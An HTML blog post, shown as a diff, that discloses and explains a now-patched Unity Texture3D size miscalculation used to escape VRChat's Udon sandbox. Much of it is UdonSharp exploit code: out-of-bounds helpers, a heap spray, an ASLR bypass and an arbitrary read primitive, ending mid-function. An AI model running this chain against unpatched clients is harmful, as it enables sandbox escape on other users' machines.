@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="referrer" content="no-referrer">
+
+        <!-- Enable responsiveness on mobile devices-->
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+        <title>Breaking out of VRChat using a Unity bug | Khang&#x27;s Stuff</title>
+<meta property="og:title" content="Breaking out of VRChat using a Unity bug | Khang&#x27;s Stuff" />
+<meta name="twitter:title" content="Breaking out of VRChat using a Unity bug | Khang&#x27;s Stuff" />
+
+        
+
+        <meta property="og:site_name" content="Khang&#x27;s Stuff" />
+        <meta property="og:url" content="https:&#x2F;&#x2F;khang06.github.io&#x2F;blog" />
+        
+        <meta property="og:image" content="https://khang06.github.io/blog/img/previews/vrcescape.png" />
+        
+
+        <link rel="stylesheet" href="https://khang06.github.io/blog/base.css" />
+
+        <link rel='icon' type='image/x-icon' href="https://khang06.github.io/blog/favicon.ico" />
+
+        
+
+        
+
+    </head>
+    <body>
+        <a href="#main" class="skip-link p-screen-reader-text">Skip to content</a>
+        <header class="l-header">
+            <!---<h1 class="c-title p-title"><a href="https:&#x2F;&#x2F;khang06.github.io&#x2F;blog" class="p-title__link">Khang&#x27;s Stuff</a></h1>--->
+            <a href="https:&#x2F;&#x2F;khang06.github.io&#x2F;blog" class="p-title__link"><picture><img src="/img/header.gif"/></picture></a>
+            <p class="p-subtitle">
+                Random projects I felt like writing about
+            </p>
+            </header>
+
+        <main id="main" class="l-main">
+            
+<article class="p-article">
+    <!--- TODO: THIS SUCKS!!!! -->
+    
+    <header class="p-article__header" style="background-image:linear-gradient(rgba(0, 0, 0, 0.9),rgba(0, 0, 0, 0.6)),url(&#x2F;img&#x2F;previews&#x2F;vrcescape.png)">
+    
+        <h1>Breaking out of VRChat using a Unity bug
+</h1>
+        <div>
+            <div class="c-time">
+
+                <time datetime="2024-11-04">
+                    2024-11-04
+                </time>
+            </div>
+        </div>
+    </header>
+    
+    <section id="js-article" class="p-article__body">
+        <p><em><strong>This vulnerability is patched in VRChat <a href="https://docs.vrchat.com/docs/vrchat-202431p4">2024.3.1p4</a> and Unity <a href="https://unity.com/releases/editor/whats-new/6000.0.20">6000.0.20f1</a>, <a href="https://unity.com/releases/editor/whats-new/2022.3.48">2022.3.48f1</a> and <a href="https://unity.com/releases/editor/whats-new/2021.3.44">2021.3.44f1</a>.</strong></em></p>
+<p><em><strong>THIS DOESN'T MEAN THAT OTHER UNITY GAMES ARE VULNERABLE! Exploiting the bug requires far more user control than the vast majority of other games allow.</strong></em></p>
+<p><a href="https://hello.vrchat.com/">VRChat</a> is a fairly popular game that heavily revolves around user-generated content. It's well known for letting users express themselves by creating and uploading their own worlds and avatars for everyone to enjoy. As great <del>(or terrifying, depending on how long you've been on the internet)</del> as that sounds, letting users upload mostly whatever they want in such a free environment also exposes a massive attack surface for software vulnerabilities.</p>
+<p>Specifically, I want to focus on VRChat's scripting language, <a href="https://creators.vrchat.com/worlds/udon/">Udon</a>. Udon is a custom bytecode virtual machine used for scripting worlds which can be written either using the <a href="https://creators.vrchat.com/worlds/udon/graph/">Udon Node Graph</a> or <a href="https://creators.vrchat.com/worlds/udon/udonsharp/">UdonSharp</a>. As the name suggests, the Udon Node Graph is a graphical node-based environment driven by connecting inputs and outputs together with lines, while UdonSharp is an environment for compiling scripts written in C# directly to Udon bytecode. Here, I'll be using UdonSharp because I think it's significantly less painful to work with than the graphical editor.</p>
+<p>The best part about Udon is that it not only exposes its own APIs, but it also allows the user to use a limited subset of Unity's APIs and the C# standard library. Combined with UdonSharp, this makes writing Udon scripts relatively painless for those who already know how to write C# code for Unity, while still sandboxing untrusted user scripts.</p>
+<p><img src="/img/vrcescape/udontypeexposure.png" alt="" /></p>
+<pre data-lang="cs" style="background-color:#1e1e1e;color:#dcdcdc;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#9b9b9b;">using </span><span>System;
+</span><span style="color:#9b9b9b;">using </span><span>UdonSharp;
+</span><span style="color:#9b9b9b;">using </span><span>UnityEngine;
+</span><span style="color:#9b9b9b;">using </span><span>VRC.SDKBase;
+</span><span style="color:#9b9b9b;">using </span><span>VRC.Udon;
+</span><span>
+</span><span style="color:#569cd6;">public class </span><span>Cube : </span><span style="color:#4ec9b0;">UdonSharpBehaviour
+</span><span>{
+</span><span>    </span><span style="color:#569cd6;">public override void </span><span>Interact()
+</span><span>    {
+</span><span>        Debug.Log(</span><span style="color:#d69d85;">&quot;Stop poking me!!!&quot;</span><span>);
+</span><span>    }
+</span><span>}
+</span></code></pre>
+<p>As long as no potentially dangerous APIs like process creation are exposed to Udon, it shouldn't be able to escape its sandbox, right?</p>
+<p>You're reading this post, so obviously, there's more to it. Like every other program, Unity isn't perfectly written. Many of its sanity checks are there to make sure gamedevs don't accidentally blow their feet off, not to defend against malicious users. Although Udon doesn't expose everything, there's still a fairly large surface area to sift through. Let's take a closer look at one particular piece of the engine.</p>
+<h1 id="unity-s-textures">Unity's Textures<a class="zola-anchor" href="#unity-s-textures" aria-label="Anchor link for: unity-s-textures"><i class="fas fa-link"></i></a> 
+</h1>
+<p>Unity's texture classes are used for exposing direct access to texture data on the CPU and uploading them to the GPU. This is useful for dynamically creating and modifying textures without render targets or shaders, like so:</p>
+<pre data-lang="cs" style="background-color:#1e1e1e;color:#dcdcdc;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#608b4e;">// Create a new 128x128 RGBA32 texture with no mipmaps
+</span><span>Texture2D texture = </span><span style="color:#569cd6;">new </span><span>Texture2D(</span><span style="color:#b5cea8;">128</span><span>, </span><span style="color:#b5cea8;">128</span><span>, TextureFormat.RGBA32, </span><span style="color:#569cd6;">false</span><span>);
+</span><span>
+</span><span style="color:#608b4e;">// Fill it with a basic XOR pattern
+</span><span style="color:#608b4e;">// Not the most efficient way to do it, but this is just an example
+</span><span style="color:#569cd6;">for </span><span>(</span><span style="color:#569cd6;">int </span><span>y = </span><span style="color:#b5cea8;">0</span><span>; y </span><span style="color:#569cd6;">&lt; </span><span style="color:#b5cea8;">128</span><span>; y</span><span style="color:#569cd6;">++</span><span>)
+</span><span>{
+</span><span>    </span><span style="color:#569cd6;">for </span><span>(</span><span style="color:#569cd6;">int </span><span>x = </span><span style="color:#b5cea8;">0</span><span>; x </span><span style="color:#569cd6;">&lt; </span><span style="color:#b5cea8;">128</span><span>; x</span><span style="color:#569cd6;">++</span><span>)
+</span><span>    {
+</span><span>        </span><span style="color:#608b4e;">// SetPixel takes a float color normalized from 0 to 1
+</span><span>        </span><span style="color:#569cd6;">float </span><span>val = (</span><span style="color:#569cd6;">float</span><span>)(x </span><span style="color:#569cd6;">^ </span><span>y) </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">0xFF</span><span>;
+</span><span>        texture.SetPixel(x, y, </span><span style="color:#569cd6;">new </span><span>Color(val, val, val, </span><span style="color:#b5cea8;">1.0</span><span style="color:#569cd6;">f</span><span>));
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span style="color:#608b4e;">// Upload it to the GPU
+</span><span>texture.Apply();
+</span><span>
+</span><span style="color:#608b4e;">// Put the texture on the cube
+</span><span>Renderer renderer = GetComponent&lt;Renderer&gt;();
+</span><span>renderer.material.mainTexture = texture;
+</span></code></pre>
+<p><img src="/img/vrcescape/xorcube.png" alt="" /></p>
+<p>Unity's <code>Texture2D</code> class caps out at a resolution of 16384px on each axis, which matches the maximum texture size of <a href="https://opengl.gpuinfo.org/displaycapability.php?name=GL_MAX_TEXTURE_SIZE">most modern PC graphics cards today</a>. With the RGBA32 texture format, where each of the four channels is stored as a byte, this ends up being a maximum texture size of <code>16384 * 16384 * 4 = 1073741824 bytes (1 GB)</code> <em>(technically this could be higher with other pixel formats, but RGBA32 is the easiest one to work with)</em></p>
+<p>We can go beyond 2D, too. There's also a <code>Texture3D</code> class, which as the name suggests, exposes a texture with three dimensions instead of two. How exciting. Unlike the 2D version, this type of texture has a per-axis resolution limit of 2048. While that doesn't sound like much, it adds up to an absurd amount of memory:  <code>2048 * 2048 * 2048 * 4 = 34359738368 bytes (32 GB!!!)</code></p>
+<p>Because I could make textures that massive, I wanted to know what would happen if I allocated a texture that had a size just over the 32-bit unsigned integer limit. This might cause some strange behavior if Unity decides to store the texture size as a 32-bit integer somewhere, but assuming that everything is working properly, it should either allocate the whole thing or refuse to make a texture that large. Let's give it a shot:</p>
+<pre data-lang="cs" style="background-color:#1e1e1e;color:#dcdcdc;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#608b4e;">// Create a new 2048*2048*256 RGBA32 texture with no mipmaps
+</span><span style="color:#608b4e;">// 2048 * 2048 * 256 * 4 = 4294967296 or 0x1_0000_0000
+</span><span>Texture3D texture = </span><span style="color:#569cd6;">new </span><span>Texture3D(</span><span style="color:#b5cea8;">2048</span><span>, </span><span style="color:#b5cea8;">2048</span><span>, </span><span style="color:#b5cea8;">256</span><span>, TextureFormat.RGBA32, </span><span style="color:#569cd6;">false</span><span>);
+</span><span>
+</span><span style="color:#608b4e;">// If we get to this point without throwing an exception, then it worked
+</span><span>Debug.Log(</span><span style="color:#d69d85;">&quot;Texture created successfully&quot;</span><span>);
+</span></code></pre>
+<p>Alright, looks like Unity's happy with the texture!</p>
+<p><img src="/img/vrcescape/bigtex1.png" alt="" /></p>
+<p>...but my memory usage didn't go up after creating the texture. Hmmm...</p>
+<p><img src="/img/vrcescape/bigtex2.png" alt="" /></p>
+<p>Maybe some weird lazy allocation stuff is happening? Let's try writing a bunch of pixels to it to see if that does anything:</p>
+<pre data-lang="cs" style="background-color:#1e1e1e;color:#dcdcdc;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#608b4e;">// This loop will write bytes spelling out &quot;ABCD&quot; in ASCII contiguously to start of the texture
+</span><span style="color:#608b4e;">// 3D textures are laid out in this order: x, y, z
+</span><span style="color:#608b4e;">// Think of it like a z-sized array of 2D x by y textures
+</span><span style="color:#608b4e;">// Remember that GetColor/SetColor take normalized float colors, but they will be converted to RGBA32
+</span><span>Color col = </span><span style="color:#569cd6;">new </span><span>Color(</span><span style="color:#b4cea8;">&#39;A&#39; </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">255.0</span><span style="color:#569cd6;">f</span><span>, </span><span style="color:#b4cea8;">&#39;B&#39; </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">255.0</span><span style="color:#569cd6;">f</span><span>, </span><span style="color:#b4cea8;">&#39;C&#39; </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">255.0</span><span style="color:#569cd6;">f</span><span>, </span><span style="color:#b4cea8;">&#39;D&#39; </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">255.0</span><span style="color:#569cd6;">f</span><span>);
+</span><span style="color:#569cd6;">for </span><span>(</span><span style="color:#569cd6;">int </span><span>i = </span><span style="color:#b5cea8;">0</span><span>; i </span><span style="color:#569cd6;">&lt; </span><span style="color:#b5cea8;">0x1000000</span><span>; i</span><span style="color:#569cd6;">++</span><span>)
+</span><span>    texture.SetPixel(i </span><span style="color:#569cd6;">% </span><span style="color:#b5cea8;">2048</span><span>, i </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">2048 </span><span style="color:#569cd6;">% </span><span style="color:#b5cea8;">2048</span><span>, i </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">2048 </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">2048</span><span>, col);
+</span></code></pre>
+<p>...aaaaand that nuked the heap and crashed the game. (check the register values!)</p>
+<p><img src="/img/vrcescape/clobbered.png" alt="" /></p>
+<h1 id="the-bug">The Bug<a class="zola-anchor" href="#the-bug" aria-label="Anchor link for: the-bug"><i class="fas fa-link"></i></a> 
+</h1>
+<p><strong>NOTE: If you want to play along at home or are interested in doing your own reverse engineering work, Unity has a <a href="http://symbolserver.unity3d.com/">public symbol store</a> that provides PDBs with symbol names for most Windows Unity builds. Although the specific build VRChat used at the time doesn't appear to be on there, <code>2022.3.22f1</code> is close to it and is more than enough for reverse engineering.</strong></p>
+<p>When creating a 3D texture <em>(see <code>Texture3D::InitTexture</code>)</em>, Unity passes the texture's width, height, format, and mipmap count into a function called <code>ComputeTextureSize</code>.</p>
+<p><img src="/img/vrcescape/wtfunity1.png" alt="" /></p>
+<p>Notice that explicit texture size check? Not only that, but according to the disassembly, <code>ComputeTextureSize</code> should be returning an unsigned 64-bit integer, which should easily fit the real size of the texture with no problem. What's up with that?</p>
+<p><img src="/img/vrcescape/wtfunity2.png" alt="" /></p>
+<p><code>ComputeTextureSize</code> loops over every mipmap level of the texture and calculates the size for each level. I won't go into full detail on how this function works because most of it is irrelevant, but the important part is here:</p>
+<p><img src="/img/vrcescape/wtfunity3.png" alt="" /></p>
+<p>The function calculates the size for each layer as a signed 32-bit integer, then sign extends the result to 64 bits before adding it to the total texture size. This is fine for figuring out if a texture is greater than 2GB but less than 4GB, since the sign extension will result in a massive unsigned 64-bit integer, failing the caller's size check.</p>
+<p>However, values over 4GB will wrap around due to overflow. That means on a 4GB texture with no mipmaps, <code>ComputeTextureSize</code> returns 0, bypassing the size check. The miscalculated size also gets used to allocate the texture buffer, leading to a trivial out-of-bounds heap read/write primitive with a controlled offset via pixel getters and setters.</p>
+<p>Now, with that out of the way, it's finally time to write a full exploit!</p>
+<h1 id="from-out-of-bounds-to-everywhere">From Out-of-Bounds to Everywhere<a class="zola-anchor" href="#from-out-of-bounds-to-everywhere" aria-label="Anchor link for: from-out-of-bounds-to-everywhere"><i class="fas fa-link"></i></a> 
+</h1>
+<p>While an out-of-bounds heap read/write within 4GB relative to the broken allocation is great and all, it'd be nicer be able to access memory at any address. To do this, I'll use the OOB texture to overwrite the data pointer of another texture object, then use that texture to read/write memory at that address.</p>
+<p>First, a couple of helper functions to make dealing with the OOB memory primitive easier:</p>
+<pre data-lang="cs" style="background-color:#1e1e1e;color:#dcdcdc;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#608b4e;">// Will be initialized later
+</span><span style="color:#569cd6;">private </span><span>Texture3D oob = </span><span style="color:#569cd6;">null</span><span>;
+</span><span>
+</span><span style="color:#569cd6;">private uint </span><span>read32Rel(</span><span style="color:#569cd6;">int </span><span>offset)
+</span><span>{
+</span><span>    </span><span style="color:#569cd6;">if </span><span>(offset </span><span style="color:#569cd6;">% </span><span style="color:#b5cea8;">4 </span><span style="color:#569cd6;">!= </span><span style="color:#b5cea8;">0</span><span>)
+</span><span>    {
+</span><span>        </span><span style="color:#608b4e;">// UdonSharp doesn&#39;t want to compile exceptions, so this will have to do
+</span><span>        Debug.LogError(</span><span style="color:#d69d85;">$&quot;read32Rel: Offset </span><span>{offset}</span><span style="color:#d69d85;"> must be aligned!!!&quot;</span><span>);
+</span><span>        </span><span style="color:#569cd6;">return </span><span style="color:#b5cea8;">0x41414141</span><span>;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#569cd6;">int </span><span>coord = offset </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">4</span><span>;
+</span><span>    </span><span style="color:#569cd6;">var </span><span>pixel = oob.GetPixel(coord </span><span style="color:#569cd6;">% </span><span style="color:#b5cea8;">2048</span><span>, coord </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">2048 </span><span style="color:#569cd6;">% </span><span style="color:#b5cea8;">2048</span><span>, coord </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">2048 </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">2048</span><span>);
+</span><span>    </span><span style="color:#569cd6;">return </span><span>((</span><span style="color:#569cd6;">uint</span><span>)(pixel[</span><span style="color:#b5cea8;">3</span><span>] </span><span style="color:#569cd6;">* </span><span style="color:#b5cea8;">0xFF</span><span>) </span><span style="color:#569cd6;">&lt;&lt; </span><span style="color:#b5cea8;">24</span><span>) </span><span style="color:#569cd6;">| </span><span>((</span><span style="color:#569cd6;">uint</span><span>)(pixel[</span><span style="color:#b5cea8;">2</span><span>] </span><span style="color:#569cd6;">* </span><span style="color:#b5cea8;">0xFF</span><span>) </span><span style="color:#569cd6;">&lt;&lt; </span><span style="color:#b5cea8;">16</span><span>) </span><span style="color:#569cd6;">| </span><span>((</span><span style="color:#569cd6;">uint</span><span>)(pixel[</span><span style="color:#b5cea8;">1</span><span>] </span><span style="color:#569cd6;">* </span><span style="color:#b5cea8;">0xFF</span><span>) </span><span style="color:#569cd6;">&lt;&lt; </span><span style="color:#b5cea8;">8</span><span>) </span><span style="color:#569cd6;">| </span><span>(</span><span style="color:#569cd6;">uint</span><span>)(pixel[</span><span style="color:#b5cea8;">0</span><span>] </span><span style="color:#569cd6;">* </span><span style="color:#b5cea8;">0xFF</span><span>);
+</span><span>}
+</span><span>
+</span><span style="color:#569cd6;">private void </span><span>write32Rel(</span><span style="color:#569cd6;">int </span><span>offset, </span><span style="color:#569cd6;">uint </span><span>data)
+</span><span>{
+</span><span>    </span><span style="color:#569cd6;">if </span><span>(offset </span><span style="color:#569cd6;">% </span><span style="color:#b5cea8;">4 </span><span style="color:#569cd6;">!= </span><span style="color:#b5cea8;">0</span><span>)
+</span><span>    {
+</span><span>        Debug.LogError(</span><span style="color:#d69d85;">$&quot;write32Rel: Offset </span><span>{offset}</span><span style="color:#d69d85;"> must be aligned!!!&quot;</span><span>);
+</span><span>        </span><span style="color:#569cd6;">return</span><span>;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#569cd6;">int </span><span>coord = offset </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">4</span><span>;
+</span><span>    Color pixel = </span><span style="color:#569cd6;">new </span><span>Color((data </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>) </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">255.0</span><span style="color:#569cd6;">f</span><span>, ((data </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">8</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>) </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">255.0</span><span style="color:#569cd6;">f</span><span>, ((data </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">16</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>) </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">255.0</span><span style="color:#569cd6;">f</span><span>, ((data </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">24</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>) </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">255.0</span><span style="color:#569cd6;">f</span><span>);
+</span><span>    oob.SetPixel(coord </span><span style="color:#569cd6;">% </span><span style="color:#b5cea8;">2048</span><span>, coord </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">2048 </span><span style="color:#569cd6;">% </span><span style="color:#b5cea8;">2048</span><span>, coord </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">2048 </span><span style="color:#569cd6;">/ </span><span style="color:#b5cea8;">2048</span><span>, pixel);
+</span><span>}
+</span></code></pre>
+<p>In order to modify another object using the OOB texture, it has to be allocated right after its texture data on the heap.</p>
+<p>Thankfully, Unity uses a custom heap allocator based on <a href="https://github.com/mattconte/tlsf">tlsf</a> that's very easy to manipulate. All I have to do is allocate a bunch of similarly sized objects to fill the free memory holes in the heap before creating the main OOB texture, which should place the its allocation at the end. Then, any new allocations should be accessible from the OOB read/write primitive.</p>
+<pre data-lang="cs" style="background-color:#1e1e1e;color:#dcdcdc;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#569cd6;">private </span><span>Texture3D[] spray1 = </span><span style="color:#569cd6;">new </span><span>Texture3D[</span><span style="color:#b5cea8;">16384</span><span>];
+</span><span style="color:#569cd6;">private </span><span>Texture3D[] spray2 = </span><span style="color:#569cd6;">new </span><span>Texture3D[</span><span style="color:#b5cea8;">1024</span><span>];
+</span><span>
+</span><span style="color:#608b4e;">// Try to fill any holes in the heap
+</span><span style="color:#608b4e;">// Better to have the spray objects be the exactly the same size as the OOB texture
+</span><span style="color:#608b4e;">// These are stored in an array to prevent them from being unexpectedly garbage collected
+</span><span style="color:#569cd6;">for </span><span>(</span><span style="color:#569cd6;">int </span><span>i = </span><span style="color:#b5cea8;">0</span><span>; i </span><span style="color:#569cd6;">&lt; </span><span>spray1.Length; i</span><span style="color:#569cd6;">++</span><span>)
+</span><span>{
+</span><span>    </span><span style="color:#569cd6;">var </span><span>temp = </span><span style="color:#569cd6;">new </span><span>Texture3D(</span><span style="color:#b5cea8;">2048</span><span>, </span><span style="color:#b5cea8;">2048</span><span>, </span><span style="color:#b5cea8;">256</span><span>, TextureFormat.RGBA32, </span><span style="color:#569cd6;">false</span><span>, </span><span style="color:#569cd6;">false</span><span>);
+</span><span>    spray1[i] = temp;
+</span><span>}
+</span><span>
+</span><span style="color:#608b4e;">// Set up OOB read/write texture
+</span><span>oob = </span><span style="color:#569cd6;">new </span><span>Texture3D(</span><span style="color:#b5cea8;">2048</span><span>, </span><span style="color:#b5cea8;">2048</span><span>, </span><span style="color:#b5cea8;">256</span><span>, TextureFormat.RGBA32, </span><span style="color:#569cd6;">false</span><span>, </span><span style="color:#569cd6;">false</span><span>);
+</span><span>Debug.Log(</span><span style="color:#d69d85;">&quot;oob texture created successfully&quot;</span><span>);
+</span><span>
+</span><span style="color:#608b4e;">// Spray Texture3Ds to eventually turn one of them into an arbitrary read/write primitive
+</span><span style="color:#608b4e;">// They&#39;re more convenient than Texture2D because they don&#39;t have an extra layer of indirection for the data pointer
+</span><span style="color:#569cd6;">for </span><span>(</span><span style="color:#569cd6;">int </span><span>i = </span><span style="color:#b5cea8;">0</span><span>; i </span><span style="color:#569cd6;">&lt; </span><span>spray2.Length; i</span><span style="color:#569cd6;">++</span><span>)
+</span><span>{
+</span><span>    </span><span style="color:#569cd6;">var </span><span>temp = </span><span style="color:#569cd6;">new </span><span>Texture3D(</span><span style="color:#b5cea8;">1</span><span>, </span><span style="color:#b5cea8;">1</span><span>, </span><span style="color:#b5cea8;">1</span><span>, TextureFormat.RGBA32, </span><span style="color:#569cd6;">false</span><span>, </span><span style="color:#569cd6;">false</span><span>);
+</span><span>    spray2[i] = temp;
+</span><span>}
+</span></code></pre>
+<p>Once that's done, I can search for and modify one of the sprayed dummy textures in OOB memory in order to have both a reference to the object in C# and its raw memory. The object search also doubles as a way to find <code>UnityPlayer.dll</code>'s base address in order to defeat ASLR.</p>
+<pre data-lang="cs" style="background-color:#1e1e1e;color:#dcdcdc;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#569cd6;">private const uint </span><span>TEX3D_VTBL_RVA = </span><span style="color:#b5cea8;">0x197D288</span><span>;
+</span><span style="color:#569cd6;">private ulong </span><span>unityPlayerBase = </span><span style="color:#b5cea8;">0</span><span>;
+</span><span style="color:#569cd6;">private int </span><span>arbTexOffset = </span><span style="color:#569cd6;">-</span><span style="color:#b5cea8;">1</span><span>;      </span><span style="color:#608b4e;">// arbTex&#39;s offset relative to the OOB texture
+</span><span style="color:#569cd6;">private </span><span>Texture3D arbTex = </span><span style="color:#569cd6;">null</span><span>;
+</span><span>
+</span><span style="color:#608b4e;">// Try to find one of the sprayed Texture3Ds
+</span><span style="color:#569cd6;">for </span><span>(</span><span style="color:#569cd6;">int </span><span>i = </span><span style="color:#b5cea8;">0</span><span>; i </span><span style="color:#569cd6;">&lt; </span><span style="color:#b5cea8;">4096</span><span>; i </span><span style="color:#569cd6;">+= </span><span style="color:#b5cea8;">8</span><span>)
+</span><span>{
+</span><span>    </span><span style="color:#608b4e;">// All 64-bit modules with ASLR have the top 24 bits of their base set to 0x00007F
+</span><span>    </span><span style="color:#608b4e;">// In order to check if the leaked pointer is Texture3D&#39;s vtable,
+</span><span>    </span><span style="color:#608b4e;">// the expected relative address gets subtracted and the result has to be page-aligned
+</span><span>    </span><span style="color:#569cd6;">ulong </span><span>leak = ((</span><span style="color:#569cd6;">ulong</span><span>)read32Rel(i </span><span style="color:#569cd6;">+ </span><span style="color:#b5cea8;">4</span><span>) </span><span style="color:#569cd6;">&lt;&lt; </span><span style="color:#b5cea8;">32</span><span>) </span><span style="color:#569cd6;">| </span><span>read32Rel(i);
+</span><span>    </span><span style="color:#569cd6;">if </span><span>(((leak </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">40</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFFFFFF</span><span>) </span><span style="color:#569cd6;">== </span><span style="color:#b5cea8;">0x7F </span><span style="color:#569cd6;">&amp;&amp; </span><span>((leak </span><span style="color:#569cd6;">- </span><span>TEX3D_VTBL_RVA) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFFF</span><span>) </span><span style="color:#569cd6;">== </span><span style="color:#b5cea8;">0</span><span>)
+</span><span>    {
+</span><span>        Debug.Log(</span><span style="color:#d69d85;">$&quot;found texture3d at oob rel 0x</span><span>{i</span><span style="color:#b4cea8;">:X</span><span>}</span><span style="color:#d69d85;">&quot;</span><span>);
+</span><span>        unityPlayerBase = leak </span><span style="color:#569cd6;">- </span><span>TEX3D_VTBL_RVA;
+</span><span>        arbTexOffset = i;
+</span><span>        </span><span style="color:#569cd6;">break</span><span>;
+</span><span>    }
+</span><span>}
+</span><span style="color:#569cd6;">if </span><span>(arbTexOffset </span><span style="color:#569cd6;">== -</span><span style="color:#b5cea8;">1</span><span>)
+</span><span>{
+</span><span>    Debug.LogError(</span><span style="color:#d69d85;">&quot;failed to find texture3d to corrupt&quot;</span><span>);
+</span><span>    </span><span style="color:#569cd6;">return</span><span>;
+</span><span>}
+</span><span>
+</span><span style="color:#608b4e;">// Modify its width and try to find the object in the spray2 array
+</span><span style="color:#608b4e;">// In testing, the initial heap spray worked so well that it always used spray2[0] as the target
+</span><span style="color:#608b4e;">// Still, better safe than sorry!
+</span><span>write32Rel(arbTexOffset </span><span style="color:#569cd6;">+ </span><span style="color:#b5cea8;">0x118</span><span>, </span><span style="color:#b5cea8;">2</span><span>);
+</span><span style="color:#569cd6;">for </span><span>(</span><span style="color:#569cd6;">int </span><span>i = </span><span style="color:#b5cea8;">0</span><span>; i </span><span style="color:#569cd6;">&lt; </span><span>spray2.Length; i</span><span style="color:#569cd6;">++</span><span>)
+</span><span>{
+</span><span>    </span><span style="color:#569cd6;">if </span><span>(spray2[i].width </span><span style="color:#569cd6;">== </span><span style="color:#b5cea8;">2</span><span>)
+</span><span>    {
+</span><span>        Debug.Log(</span><span style="color:#d69d85;">$&quot;found corrupted texture3d! spray2[0x</span><span>{i</span><span style="color:#b4cea8;">:X</span><span>}</span><span style="color:#d69d85;">] with width </span><span>{spray2[i].width}</span><span style="color:#d69d85;">&quot;</span><span>);
+</span><span>        arbTex = spray2[i];
+</span><span>        </span><span style="color:#569cd6;">break</span><span>;
+</span><span>    }
+</span><span>}
+</span><span style="color:#569cd6;">if </span><span>(arbTex </span><span style="color:#569cd6;">== null</span><span>)
+</span><span>{
+</span><span>    Debug.LogError(</span><span style="color:#d69d85;">&quot;failed to find corrupted texture3d&quot;</span><span>);
+</span><span>    </span><span style="color:#569cd6;">return</span><span>;
+</span><span>}
+</span></code></pre>
+<p>Finally, I can construct an arbitrary read/write primitive by overwriting the data pointer. Since the target texture is now RGBA32 2x1x1, I can read/write 64 bits at a time, which is the perfect amount to be useful for exploit setup.</p>
+<pre data-lang="cs" style="background-color:#1e1e1e;color:#dcdcdc;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#569cd6;">private ulong </span><span>read64(</span><span style="color:#569cd6;">ulong </span><span>addr)
+</span><span>{
+</span><span>    </span><span style="color:#608b4e;">// Overwrite the texture data pointer
+</span><span>    write32Rel(arbTexOffset </span><span style="color:#569cd6;">+ </span><span style="color:#b5cea8;">0x128</span><span>, (</span><span style="color:#569cd6;">uint</span><span>)(addr </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFFFFFFFF</span><span>));
+</span><span>    write32Rel(arbTexOffset </span><span style="color:#569cd6;">+ </span><span style="color:#b5cea8;">0x12C</span><span>, (</span><span style="color:#569cd6;">uint</span><span>)(addr </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">32</span><span>));
+</span><span>
+</span><span>    </span><span style="color:#569cd6;">var </span><span>data = arbTex.GetPixels32();
+</span><span>
+</span><span>    </span><span style="color:#569cd6;">return </span><span>data[</span><span style="color:#b5cea8;">0</span><span>][</span><span style="color:#b5cea8;">0</span><span>] </span><span style="color:#569cd6;">|
+</span><span>            ((</span><span style="color:#569cd6;">ulong</span><span>)data[</span><span style="color:#b5cea8;">0</span><span>][</span><span style="color:#b5cea8;">1</span><span>] </span><span style="color:#569cd6;">&lt;&lt; </span><span style="color:#b5cea8;">8</span><span>) </span><span style="color:#569cd6;">|
+</span><span>            ((</span><span style="color:#569cd6;">ulong</span><span>)data[</span><span style="color:#b5cea8;">0</span><span>][</span><span style="color:#b5cea8;">2</span><span>] </span><span style="color:#569cd6;">&lt;&lt; </span><span style="color:#b5cea8;">16</span><span>) </span><span style="color:#569cd6;">|
+</span><span>            ((</span><span style="color:#569cd6;">ulong</span><span>)data[</span><span style="color:#b5cea8;">0</span><span>][</span><span style="color:#b5cea8;">3</span><span>] </span><span style="color:#569cd6;">&lt;&lt; </span><span style="color:#b5cea8;">24</span><span>) </span><span style="color:#569cd6;">|
